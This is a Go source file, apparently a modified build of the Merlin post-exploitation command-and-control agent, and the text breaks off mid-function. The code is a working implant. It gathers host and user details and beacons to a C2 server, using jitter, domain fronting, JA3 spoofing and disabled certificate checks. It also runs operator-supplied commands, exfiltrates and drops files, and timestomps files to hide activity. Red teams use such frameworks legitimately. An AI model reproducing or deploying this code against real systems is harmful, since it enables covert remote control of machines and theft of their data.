// Merlin is a post-exploitation command and control framework.
// This file is part of Merlin.
// Copyright (C) 2019  Russel Van Tuyl

// Merlin is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.

// Merlin is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Merlin.  If not, see <http://www.gnu.org/licenses/>.

package agent

import (
	// Standard
	"bytes"
	cryptorand "crypto/rand"
	"crypto/rsa"
	"crypto/sha1" // #nosec G505
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/gob"
	"fmt"
	"io"
	"io/ioutil"
	"math"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/Ne0nd0g/ja3transport"
	// 3rd Party
	"github.com/cretz/gopaque/gopaque"
	"github.com/fatih/color"
	"github.com/lucas-clemente/quic-go"
	"github.com/lucas-clemente/quic-go/http3"
	uuid "github.com/satori/go.uuid"
	"golang.org/x/crypto/pbkdf2"
	"golang.org/x/net/http2"
	"gopkg.in/square/go-jose.v2"
	"gopkg.in/square/go-jose.v2/jwt"

	// Merlin
	merlin "github.com/Ne0nd0g/merlin/pkg"
	"github.com/Ne0nd0g/merlin/pkg/core"
	"github.com/Ne0nd0g/merlin/pkg/messages"
)

// GLOBAL VARIABLES
var build = "nonRelease" // build is the build number of the Merlin Agent program set at compile time

type merlinClient interface {
	Do(req *http.Request) (*http.Response, error)
	Get(url string) (resp *http.Response, err error)
	Head(url string) (resp *http.Response, err error)
	Post(url, contentType string, body io.Reader) (resp *http.Response, err error)
}

//TODO this is a duplicate with agents/agents.go, centralize

// Agent is a structure for agent objects. It is not exported to force the use of the New() function
type Agent struct {
	ID                 uuid.UUID       // ID is a Universally Unique Identifier per agent
	Note               string          // Actual agents don't track the note, but this is a placeholder because the struct is copied
	Platform           string          // Platform is the operating system platform the agent is running on (i.e. windows)
	Architecture       string          // Architecture is the operating system architecture the agent is running on (i.e. amd64)
	UserName           string          // UserName is the username that the agent is running as
	UserGUID           string          // UserGUID is a Globally Unique Identifier associated with username
	HostName           string          // HostName is the computer's host name
	Ips                []string        // Ips is a slice of all the IP addresses assigned to the host's interfaces
	Pid                int             // Pid is the Process ID that the agent is running under
	Process            string          // Process is this agent's process name in memory
	iCheckIn           time.Time       // iCheckIn is a timestamp of the agent's initial check in time
	sCheckIn           time.Time       // sCheckIn is a timestamp of the agent's last status check in time
	Version            string          // Version is the version number of the Merlin Agent program
	Build              string          // Build is the build number of the Merlin Agent program
	WaitTimeMin        int64           // WaitTimeMin is shortest amount of time in which the agent waits in-between checking in
	WaitTimeMax        int64           // WaitTimeMax is longest amount of time in which the agent waits in-between checking in
	PaddingMax         int             // PaddingMax is the maximum size allowed for a randomly selected message padding length
	MaxRetry           int             // MaxRetry is the maximum amount of failed check in attempts before the agent quits
	FailedCheckin      int             // FailedCheckin is a count of the total number of failed check ins
	InactiveCount      int             // InactiveCount is a count of the total number of check ins with no commands
	InactiveMultiplier int64           // InactiveMultipler is the amount to multiply WaitTime(Min/Max) by when agent goes inactive
	InactiveThreshold  int             // InactiveThreshold is the number of check ins with no commands before an agent goes inactive
	ActiveMin          int64           // ActiveMin keeps track of the originally configured WaitTimeMin
	ActiveMax          int64           // ActiveMax keeps track of the originally configured WaitTimeMax
	Verbose            bool            // Verbose enables verbose messages to standard out
	Debug              bool            // Debug enables debug messages to standard out
	Proto              string          // Proto contains the transportation protocol the agent is using (i.e. http2 or http3)
	Client             *merlinClient   // Client is an interface for clients to make connections for agent communications
	UserAgent          string          // UserAgent is the user agent string used with HTTP connections
	initial            bool            // initial identifies if the agent has successfully completed the first initial check in
	KillDate           int64           // killDate is a unix timestamp that denotes a time the executable will not run after (if it is 0 it will not be used)
	RSAKeys            *rsa.PrivateKey // RSA Private/Public key pair; Private key used to decrypt messages
	PublicKey          rsa.PublicKey   // Public key (of server) used to encrypt messages
	secret             []byte          // secret is used to perform symmetric encryption operations
	JWT                string          // Authentication JSON Web Token
	URL                string          // The C2 server URL
	Host               string          // HTTP Host header, typically used with Domain Fronting
	pwdU               []byte          // SHA256 hash from 5000 iterations of PBKDF2 with a 30 character random string input
	psk                string          // Pre-Shared Key
	JA3                string          // JA3 signature (not the MD5 hash) used to generate a JA3 client
	BatchCommands      bool            // Run all available commands each checkin (vs. one per checkin)
}

// New creates a new agent struct with specific values and returns the object
func New(protocol string, url string, host string, psk string, proxy string, ja3 string, verbose bool, debug bool) (Agent, error) {
	if debug {
		message("debug", "Entering agent.New function")
	}

	//Dance required so gandalf_generate.py patch script can replace these values in a pre-compiled binary

	//18 digit max
	StrWaitTimeMin := "999999999999999999"
	IntWaitTimeMin, _ := strconv.ParseInt(StrWaitTimeMin, 10, 64)

	//18 digit max
	StrWaitTimeMax := "888888888888888888"
	IntWaitTimeMax, _ := strconv.ParseInt(StrWaitTimeMax, 10, 64)

	//18 digit max
	StrInactiveMultiplier := "777777777777777777"
	IntInactiveMultiplier, _ := strconv.ParseInt(StrInactiveMultiplier, 10, 64)

	//18 digit max
	StrInactiveThreshold := "666666666666666666"
	IntInactiveThreshold, _ := strconv.Atoi(StrInactiveThreshold)

	//18 digit max
	StrMaxRetry := "555555555555555555"
	IntMaxRetry, _ := strconv.Atoi(StrMaxRetry)

	//18 digit max
	StrPaddingMax := "444444444444444444"
	IntPaddingMax, _ := strconv.Atoi(StrPaddingMax)

	//18 digit max
	StrKillDate := "000000000000000000"
	IntKillDate, _ := strconv.ParseInt(StrKillDate, 10, 64)

	//200 character max
	StrUserAgentPre := "ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ"
	StrUserAgentPost := strings.Trim(StrUserAgentPre, " ")

	//200 character max
	StrURLPre := "YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY"
	StrURLPost := strings.Trim(StrURLPre, " ")

	StrProtocolPre := "XXXXX"
	StrProtocolPost := strings.Trim(StrProtocolPre, " ")

	//200 character max
	StrPSKPre := "WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW"
	StrPSKPost := strings.Trim(StrPSKPre, " ")

	//200 character max
	StrProxyPre := "VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV"
	StrProxyPost := strings.Trim(StrProxyPre, " ")

	//200 character max
	StrJA3Pre := "UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU"
	StrJA3Post := strings.Trim(StrJA3Pre, " ")

	//200 character max
	StrHostHeaderPre := "TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT"
	StrHostHeaderPost := strings.Trim(StrHostHeaderPre, " ")

	a := Agent{
		ID:                 uuid.NewV4(),
		Platform:           runtime.GOOS,
		Architecture:       runtime.GOARCH,
		Pid:                os.Getpid(),
		Version:            merlin.Version,
		WaitTimeMin:        IntWaitTimeMin,
		ActiveMin:          IntWaitTimeMin,
		WaitTimeMax:        IntWaitTimeMax,
		ActiveMax:          IntWaitTimeMax,
		PaddingMax:         IntPaddingMax,
		MaxRetry:           IntMaxRetry,
		InactiveMultiplier: IntInactiveMultiplier,
		InactiveThreshold:  IntInactiveThreshold,
		Verbose:            verbose,
		Debug:              debug,
		Proto:              StrProtocolPost,
		UserAgent:          StrUserAgentPost,
		initial:            false,
		KillDate:           IntKillDate,
		URL:                StrURLPost,
		Host:               StrHostHeaderPost,
		JA3:                StrJA3Post,
		BatchCommands:      true,
	}

	rand.Seed(time.Now().UnixNano())

	u, errU := user.Current()
	if errU != nil {
		return a, fmt.Errorf("there was an error getting the current user:\r\n%s", errU)
	}

	a.UserName = u.Username
	a.UserGUID = u.Gid

	h, errH := os.Hostname()
	if errH != nil {
		return a, fmt.Errorf("there was an error getting the hostname:\r\n%s", errH)
	}
	a.HostName = h

	p, errP := os.Executable()
	if errP != nil {
		return a, fmt.Errorf("there was an error getting the process:\r\n%s", errH)
	}
	a.Process = p

	interfaces, errI := net.Interfaces()
	if errI != nil {
		return a, fmt.Errorf("there was an error getting the IP addresses:\r\n%s", errI)
	}

	for _, iface := range interfaces {
		addrs, err := iface.Addrs()
		if err == nil {
			for _, addr := range addrs {
				a.Ips = append(a.Ips, addr.String())
			}
		} else {
			return a, fmt.Errorf("there was an error getting interface information:\r\n%s", err)
		}
	}

	var errClient error

	a.Client, errClient = getClient(a.Proto, StrProxyPost, a.JA3)

	if errClient != nil {
		return a, fmt.Errorf("there was an error getting a transport client:\r\n%s", errClient)
	}

	// Generate a random password and run it through 5000 iterations of PBKDF2; Used with OPAQUE
	x := core.RandStringBytesMaskImprSrc(30)
	a.pwdU = pbkdf2.Key([]byte(x), a.ID.Bytes(), 5000, 32, sha256.New)

	// Set encryption secret to pre-authentication pre-shared key
	a.psk = StrPSKPost

	// Generate RSA key pair
	privateKey, rsaErr := rsa.GenerateKey(cryptorand.Reader, 4096)
	if rsaErr != nil {
		return a, fmt.Errorf("there was an error generating the RSA key pair:\r\n%s", rsaErr)
	}

	a.RSAKeys = privateKey

	if a.Verbose {
		message("info", "Host Information:")
		message("info", fmt.Sprintf("\tAgent UUID: %s", a.ID))
		message("info", fmt.Sprintf("\tPlatform: %s", a.Platform))
		message("info", fmt.Sprintf("\tArchitecture: %s", a.Architecture))
		message("info", fmt.Sprintf("\tUser Name: %s", a.UserName)) //TODO A username like _svctestaccont causes error
		message("info", fmt.Sprintf("\tUser GUID: %s", a.UserGUID))
		message("info", fmt.Sprintf("\tHostname: %s", a.HostName))
		message("info", fmt.Sprintf("\tPID: %d", a.Pid))
		message("info", fmt.Sprintf("\tProcess: %s", a.Process))
		message("info", fmt.Sprintf("\tIPs: %v", a.Ips))
		message("info", fmt.Sprintf("\tProtocol: %s", a.Proto))
		message("info", fmt.Sprintf("\tProxy: %v", proxy))
		message("info", fmt.Sprintf("\tJA3 Signature: %s", a.JA3))
	}
	if debug {
		message("debug", "Leaving agent.New function")
	}
	return a, nil
}

// Run instructs an agent to establish communications with the passed in server using the passed in protocol
func (a *Agent) Run() error {
	rand.Seed(time.Now().UTC().UnixNano())

	if a.Verbose {
		message("note", fmt.Sprintf("Agent version: %s", merlin.Version))
		message("note", fmt.Sprintf("Agent build: %s", build))
	}

	for {
		// Check killdate to see if the agent should checkin
		if (a.KillDate == 0) || (time.Now().Unix() < a.KillDate) {
			if a.initial {
				if a.Verbose {
					message("note", "Checking in...")
				}
				a.statusCheckIn()
			} else {
				a.initial = a.initialCheckIn()
			}
			if a.FailedCheckin >= a.MaxRetry {
				return fmt.Errorf("maximum number of failed checkin attempts reached: %d", a.MaxRetry)
			}
		} else {
			return fmt.Errorf("agent kill date has been exceeded: %s", time.Unix(a.KillDate, 0).UTC().Format(time.RFC3339))
		}

		var totalWaitTime time.Duration
		if a.WaitTimeMin != a.WaitTimeMax {
			rand.Seed(time.Now().UnixNano())
			totalWaitTimeInt := rand.Int63n(a.WaitTimeMax-a.WaitTimeMin) + a.WaitTimeMin
			totalWaitTime = time.Duration(totalWaitTimeInt) * time.Second
		} else {
			totalWaitTime = time.Duration(a.WaitTimeMax) * time.Second
		}

		if a.Verbose {
			message("note", fmt.Sprintf("Sleeping for %s at %s", totalWaitTime.String(), time.Now().UTC().Format(time.RFC3339)))
		}
		time.Sleep(totalWaitTime)
	}
}

func (a *Agent) initialCheckIn() bool {

	if a.Debug {
		message("debug", "Entering initialCheckIn function")
	}

	// Register
	errOPAQUEReg := a.opaqueRegister()
	if errOPAQUEReg != nil {
		a.FailedCheckin++
		inactiveCheckin(a)
		if a.Verbose {
			message("warn", errOPAQUEReg.Error())
			message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
		}
		return false
	}

	// Authenticate
	errOPAQUEAuth := a.opaqueAuthenticate()
	if errOPAQUEAuth != nil {
		a.FailedCheckin++
		inactiveCheckin(a)
		if a.Verbose {
			message("warn", errOPAQUEAuth.Error())
			message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
		}
		return false
	}

	// Now that the agent is authenticated, send in agent info
	infoResponse, errAgentInfo := a.sendMessage("POST", a.getAgentInfoMessage())
	if errAgentInfo != nil {
		a.FailedCheckin++
		inactiveCheckin(a)
		if a.Verbose {
			message("warn", errAgentInfo.Error())
			message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
		}
		return false
	}
	_, errHandler := a.messageHandler(infoResponse)
	if errHandler != nil {
		if a.Verbose {
			message("warn", errHandler.Error())
		}
	}

	// Send RSA keys encrypted using authentication derived secret
	errRSA := a.rsaKeyExchange()
	if errRSA != nil {
		if a.Verbose {
			message("warn", errRSA.Error())
		}
	}

	if a.FailedCheckin > 0 && a.FailedCheckin < a.MaxRetry {
		if a.Verbose {
			message("note", fmt.Sprintf("Updating server with failed checkins from %d to 0", a.FailedCheckin))
		}
		a.FailedCheckin = 0
		infoResponse, err := a.sendMessage("POST", a.getAgentInfoMessage())
		if err != nil {
			if a.Verbose {
				message("warn", err.Error())
			}
			return false
		}
		_, errHandler2 := a.messageHandler(infoResponse)
		if errHandler2 != nil {
			if a.Verbose {
				message("warn", errHandler2.Error())
			}
		}
	}

	if a.Debug {
		message("debug", "Leaving initialCheckIn function, returning True")
	}
	a.iCheckIn = time.Now().UTC()
	return true
}

func (a *Agent) statusCheckIn() {
	if a.Debug {
		message("debug", "Entering into agent.statusCheckIn()")
	}

	statusMessage := messages.Base{
		Version: 1.0,
		ID:      a.ID,
		Type:    "StatusCheckIn",
		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
	}

	j, reqErr := a.sendMessage("POST", statusMessage)

	if reqErr != nil {
		a.FailedCheckin++
		inactiveCheckin(a)
		if a.Verbose {
			message("warn", reqErr.Error())
			message("note", fmt.Sprintf("%d out of %d total failed checkins", a.FailedCheckin, a.MaxRetry))
		}

		// Handle HTTP3 Errors
		if a.Proto == "http3" {
			e := ""
			n := false

			// Application error 0x0 is typically the result of the server sending a CONNECTION_CLOSE frame
			if strings.Contains(reqErr.Error(), "Application error 0x0") {
				n = true
				e = "Building new HTTP/3 client because received QUIC CONNECTION_CLOSE frame with NO_ERROR transport error code"
			}

			// Handshake timeout happens when a new client was not able to reach the server and setup a crypto handshake for the first time (no listener or no access)
			if strings.Contains(reqErr.Error(), "NO_ERROR: Handshake did not complete in time") {
				n = true
				e = "Building new HTTP/3 client because QUIC HandshakeTimeout reached"
			}

			// No recent network activity happens when a PING timeout occurs.  KeepAlive setting can be used to prevent MaxIdleTimeout
			// When the client has previously established a crypto handshake but does not hear back from it's PING frame the server within the client's MaxIdleTimeout
			// Typically happens when the Merlin Server application is killed/quit without sending a CONNECTION_CLOSE frame from stopping the listener
			if strings.Contains(reqErr.Error(), "NO_ERROR: No recent network activity") {
				n = true
				e = "Building new HTTP/3 client because QUIC MaxIdleTimeout reached"
			}

			if a.Debug {
				message("debug", fmt.Sprintf("HTTP/3 error: %s", reqErr.Error()))
			}

			if n {
				if a.Verbose {
					message("note", e)
				}
				var errClient error
				a.Client, errClient = getClient(a.Proto, "", "")
				if errClient != nil {
					message("warn", fmt.Sprintf("there was an error getting a new HTTP/3 client: %s", errClient.Error()))
				}
			}
		}
		return
	}

	a.FailedCheckin = 0

	a.sCheckIn = time.Now().UTC()

	if a.Debug {
		message("debug", fmt.Sprintf("Agent ID: %s", j.ID))
		message("debug", fmt.Sprintf("Message Type: %s", j.Type))
		message("debug", fmt.Sprintf("Message Payload: %s", j.Payload))
	}

	// handle message
	m, err := a.messageHandler(j)

	if err != nil {
		if a.Verbose {
			message("warn", err.Error())
		}
		return
	}

	// If the server indicated there were more jobs in the queue to be executed, will run those too
	if a.BatchCommands && m.MoreJobs {
		a.statusCheckIn()
	}

	// Used when the message was ServerOK, no further processing is needed
	if m.Type == "" {
		//Agent successfully checked in, but no tasks were queued
		a.InactiveCount++
		if a.InactiveCount == a.InactiveThreshold {
			a.InactiveCount = 0
			//Should only happen if an orphaned agent checks in and isn't interacted with
			if a.WaitTimeMin < a.ActiveMin {
				a.WaitTimeMin = a.ActiveMin
				a.WaitTimeMax = a.ActiveMax
			} else {
				a.WaitTimeMin *= a.InactiveMultiplier
				a.WaitTimeMax *= a.InactiveMultiplier
			}
			a.sendMessage("POST", a.getAgentInfoMessage())
		}
		return
	}

	//Agent successfully checked in and there is a task to perform
	a.InactiveCount = 0
	if a.WaitTimeMin != a.ActiveMin {
		a.WaitTimeMin = a.ActiveMin
		a.WaitTimeMax = a.ActiveMax
		a.sendMessage("POST", a.getAgentInfoMessage())
	}

	_, errR := a.sendMessage("POST", m)

	if errR != nil {
		if a.Verbose {
			message("warn", errR.Error())
		}
		return
	}

}

func inactiveCheckin(a *Agent) {
	a.InactiveCount++
	if a.InactiveCount == a.InactiveThreshold {
		a.InactiveCount = 0
		a.WaitTimeMin *= a.InactiveMultiplier
		a.WaitTimeMax *= a.InactiveMultiplier
	}
}

// getClient returns a HTTP client for the passed in protocol (i.e. h2 or http3)
func getClient(protocol string, proxyURL string, ja3 string) (*merlinClient, error) {

	var m merlinClient

	/* #nosec G402 */
	// G402: TLS InsecureSkipVerify set true. (Confidence: HIGH, Severity: HIGH) Allowed for testing
	// Setup TLS configuration
	TLSConfig := &tls.Config{
		MinVersion:         tls.VersionTLS12,
		InsecureSkipVerify: true, // #nosec G402 - see https://github.com/Ne0nd0g/merlin/issues/59 TODO fix this
		CipherSuites: []uint16{
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
		},
		NextProtos: []string{protocol},
	}

	// Proxy
	var proxy func(*http.Request) (*url.URL, error)
	if proxyURL != "" {
		rawURL, errProxy := url.Parse(proxyURL)
		if errProxy != nil {
			return nil, fmt.Errorf("there was an error parsing the proxy string:\r\n%s", errProxy.Error())
		}
		proxy = http.ProxyURL(rawURL)
	}

	// JA3
	if ja3 != "" {
		JA3, errJA3 := ja3transport.NewWithStringInsecure(ja3)
		if errJA3 != nil {
			return &m, fmt.Errorf("there was an error getting a new JA3 client:\r\n%s", errJA3.Error())
		}
		tr, err := ja3transport.NewTransportInsecure(ja3)
		if err != nil {
			return nil, err
		}

		// Set proxy
		if proxyURL != "" {
			tr.Proxy = proxy
		}

		JA3.Transport = tr

		m = JA3
		return &m, nil
	}

	var transport http.RoundTripper
	switch strings.ToLower(protocol) {
	case "http3":
		transport = &http3.RoundTripper{
			QuicConfig: &quic.Config{
				// Opted for a long timeout to prevent the client from sending a PING Frame
				// If MaxIdleTimeout is too high, agent will never get an error if the server is off line and will perpetually run without exiting because MaxFailedCheckins is never incremented
				//MaxIdleTimeout: time.Until(time.Now().AddDate(0, 42, 0)),
				MaxIdleTimeout: time.Second * 30,
				// KeepAlive will send a HTTP/2 PING frame to keep the connection alive
				// If this isn't used, and the agent's sleep is greater than the MaxIdleTimeout, then the connection will timeout
				KeepAlive: true,
				// HandshakeTimeout is how long the client will wait to hear back while setting up the initial crypto handshake w/ server
				HandshakeTimeout: time.Second * 30,
			},
			TLSClientConfig: TLSConfig,
		}
	case "h2":
		transport = &http2.Transport{
			TLSClientConfig: TLSConfig,
		}
	case "h2c":
		transport = &http2.Transport{
			AllowHTTP: true,
			DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
				return net.Dial(network, addr)
			},
		}
	case "https":
		if proxyURL != "" {
			transport = &http.Transport{
				TLSClientConfig: TLSConfig,
				Proxy:           proxy,
			}
		} else {
			transport = &http.Transport{
				TLSClientConfig: TLSConfig,
			}
		}
	case "http":
		if proxyURL != "" {
			transport = &http.Transport{
				MaxIdleConns: 10,
				Proxy:        proxy,
			}
		} else {
			transport = &http.Transport{
				MaxIdleConns: 10,
			}
		}
	default:
		return nil, fmt.Errorf("%s is not a valid client protocol", protocol)
	}
	m = &http.Client{Transport: transport}
	return &m, nil
}

// sendMessage is a generic function to receive a messages.Base struct, encode it, encrypt it, and send it to the server
// The response message will be decrypted, decoded, and return a messages.Base struct.
func (a *Agent) sendMessage(method string, m messages.Base) (messages.Base, error) {
	if a.Debug {
		message("debug", "Entering into agent.sendMessage()")
	}
	if a.Verbose {
		message("note", fmt.Sprintf("Sending %s message to %s", m.Type, a.URL))
	}

	var returnMessage messages.Base

	// Convert messages.Base to gob
	messageBytes := new(bytes.Buffer)
	errGobEncode := gob.NewEncoder(messageBytes).Encode(m)
	if errGobEncode != nil {
		return returnMessage, fmt.Errorf("there was an error encoding the %s message to a gob:\r\n%s", m.Type, errGobEncode.Error())
	}

	// Get JWE
	jweString, errJWE := core.GetJWESymetric(messageBytes.Bytes(), a.secret)
	if errJWE != nil {
		return returnMessage, errJWE
	}

	// Encode JWE into gob
	jweBytes := new(bytes.Buffer)
	errJWEBuffer := gob.NewEncoder(jweBytes).Encode(jweString)
	if errJWEBuffer != nil {
		return returnMessage, fmt.Errorf("there was an error encoding the %s JWE string to a gob:\r\n%s", m.Type, errJWEBuffer.Error())
	}

	switch strings.ToLower(method) {
	case "post":
		req, reqErr := http.NewRequest("POST", a.URL, jweBytes)
		if reqErr != nil {
			return returnMessage, fmt.Errorf("there was an error building the HTTP request:\r\n%s", reqErr.Error())
		}

		if req != nil {
			req.Header.Set("User-Agent", a.UserAgent)
			req.Header.Set("Content-Type", "application/octet-stream; charset=utf-8")
			req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", a.JWT))
			if a.Host != "" {
				req.Host = a.Host
			}
		}

		// Send the request
		var client merlinClient // Why do I need to prove that a.Client is merlinClient type?
		client = *a.Client
		if a.Debug {
			message("debug", fmt.Sprintf("Sending POST request size: %d to: %s", req.ContentLength, a.URL))
		}
		resp, err := client.Do(req)

		if err != nil {
			return returnMessage, fmt.Errorf("there was an error with the %s client while performing a POST:\r\n%s", a.Proto, err.Error())
		}
		if a.Debug {
			message("debug", fmt.Sprintf("HTTP Response:\r\n%+v", resp))
		}

		switch resp.StatusCode {
		case 200:
			break
		case 401:
			if a.Verbose {
				message("note", "server returned a 401, reauthenticating orphaned agent")
			}
			a.WaitTimeMin = 15
			a.WaitTimeMax = 30
			a.InactiveCount = 0
			msg := messages.Base{
				Version: 1.0,
				ID:      a.ID,
				Type:    "ReAuthenticate",
			}
			return msg, err
		default:
			return returnMessage, fmt.Errorf("there was an error communicating with the server:\r\n%d", resp.StatusCode)
		}

		contentType := resp.Header.Get("Content-Type")
		if contentType == "" {
			return returnMessage, fmt.Errorf("the response did not contain a Content-Type header")
		}

		// Check to make sure the response contains the application/octet-stream Content-Type header
		isOctet := false
		for _, v := range strings.Split(contentType, ",") {
			if strings.ToLower(v) == "application/octet-stream" {
				isOctet = true
			}
		}

		if !isOctet {
			return returnMessage, fmt.Errorf("the response message did not contain the application/octet-stream Content-Type header")
		}

		// Check to make sure message response contained data
		// TODO Temporarily disabled length check for HTTP/3 connections https://github.com/lucas-clemente/quic-go/issues/2398
		if resp.ContentLength == 0 && a.Proto != "http3" {
			return returnMessage, fmt.Errorf("the response message did not contain any data")
		}

		var jweString string

		// Decode GOB from server response into JWE
		errD := gob.NewDecoder(resp.Body).Decode(&jweString)
		if errD != nil {
			return returnMessage, fmt.Errorf("there was an error decoding the gob message:\r\n%s", errD.Error())
		}

		// Decrypt JWE to messages.Base
		respMessage, errDecrypt := core.DecryptJWE(jweString, a.secret)
		if errDecrypt != nil {
			return returnMessage, errDecrypt
		}

		// Verify UUID matches
		if respMessage.ID != a.ID {
			if a.Verbose {
				return returnMessage, fmt.Errorf("response message agent ID %s does not match current ID %s", respMessage.ID.String(), a.ID.String())
			}
		}
		return respMessage, nil
	default:
		return returnMessage, fmt.Errorf("%s is an invalid method for sending a message", method)
	}
}

// messageHandler looks at the message type and performs the associated action
func (a *Agent) messageHandler(m messages.Base) (messages.Base, error) {
	if a.Debug {
		message("debug", "Entering into agent.messageHandler function")
	}
	if a.Verbose {
		message("success", fmt.Sprintf("%s message type received!", m.Type))
	}

	returnMessage := messages.Base{
		Version: 1.0,
		ID:      a.ID,
		Padding: core.RandStringBytesMaskImprSrc(a.PaddingMax),
	}

	if a.ID != m.ID {
		return returnMessage, fmt.Errorf("the input message UUID did not match this agent's UUID %s:%s", a.ID, m.ID)
	}
	var c messages.CmdResults
	if m.Token != "" {
		a.JWT = m.Token
	}

	switch m.Type {
	case "FileTransfer":
		p := m.Payload.(messages.FileTransfer)
		c.Job = p.Job
		// Agent will be downloading a file from the server
		if p.IsDownload {
			if a.Verbose {
				message("note", "FileTransfer type: Download")
			}

			d, _ := filepath.Split(p.FileLocation)
			_, directoryPathErr := os.Stat(d)
			if directoryPathErr != nil {
				c.Stderr = fmt.Sprintf("There was an error getting the FileInfo structure for the remote "+
					"directory %s:\r\n", p.FileLocation)
				c.Stderr += directoryPathErr.Error()
			}
			if c.Stderr == "" {
				if a.Verbose {
					message("note", fmt.Sprintf("Writing file to %s", p.FileLocation))
				}
				downloadFile, downloadFileErr := base64.StdEncoding.DecodeString(p.FileBlob)
				if downloadFileErr != nil {
					c.Stderr = downloadFileErr.Error()
				} else {
					errF := ioutil.WriteFile(p.FileLocation, downloadFile, 0600)
					if errF != nil {
						c.Stderr = errF.Error()
					} else {
						c.Stdout = fmt.Sprintf("Successfully uploaded file to %s on agent %s", p.FileLocation, a.ID.String())
					}
				}
			}
		}
		// Agent will uploading a file to the server
		if !p.IsDownload {
			if a.Verbose {
				message("note", "FileTransfer type: Upload")
			}

			fileData, fileDataErr := ioutil.ReadFile(p.FileLocation)
			if fileDataErr != nil {
				if a.Verbose {
					message("warn", fmt.Sprintf("There was an error reading %s", p.FileLocation))
					message("warn", fileDataErr.Error())
				}
				c.Stderr = fmt.Sprintf("there was an error reading %s:\r\n%s", p.FileLocation, fileDataErr.Error())
			} else {
				fileHash := sha1.New() // #nosec G401 // Use SHA1 because it is what many Blue Team tools use
				_, errW := io.WriteString(fileHash, string(fileData))
				if errW != nil {
					if a.Verbose {
						message("warn", fmt.Sprintf("There was an error generating the SHA1 file hash e:\r\n%s", errW.Error()))
					}
				}

				if a.Verbose {
					message("note", fmt.Sprintf("Uploading file %s of size %d bytes and a SHA1 hash of %x to the server",
						p.FileLocation,
						len(fileData),
						fileHash.Sum(nil)))
				}
				ft := messages.FileTransfer{
					FileLocation: p.FileLocation,
					FileBlob:     base64.StdEncoding.EncodeToString([]byte(fileData)),
					IsDownload:   true,
					Job:          p.Job,
				}

				returnMessage.Type = "FileTransfer"
				returnMessage.Payload = ft
				return returnMessage, nil
			}
		}
	case "CmdPayload":
		p := m.Payload.(messages.CmdPayload)
		c.Job = p.Job
		c.Stdout, c.Stderr = a.executeCommand(p)
	case "WinExecute":
		p := m.Payload.(messages.WinExecute)
		c.Job = p.Job
		c.Stdout, c.Stderr = a.winExecute(p)
	case "TouchFile":
		p := m.Payload.(messages.TouchFile)
		c.Job = p.Job

		// get last modified time of source file
		sourcefile, err1 := os.Stat(p.SrcFile)
		if err1 != nil {
			c.Stderr = fmt.Sprintf("Error retrieving last modified time of: %s\n%s\n", p.SrcFile, err1.Error())
		}
		modifiedtime := sourcefile.ModTime()

		// change both atime and mtime to last modified time of source file
		err2 := os.Chtimes(p.DstFile, modifiedtime, modifiedtime)
		if err2 != nil {
			c.Stderr = fmt.Sprintf("Error changing last modified and accessed time of: %s\n%s\n", p.DstFile, err2.Error())
		} else {
			c.Stdout = fmt.Sprintf("File: %s\nLast modified and accessed time set to: %s\n", p.DstFile, modifiedtime)
		}
	case "ServerOk":
		if a.Verbose {
			message("note", "Received Server OK, doing nothing")
		}
		return returnMessage, nil
	case "Module":
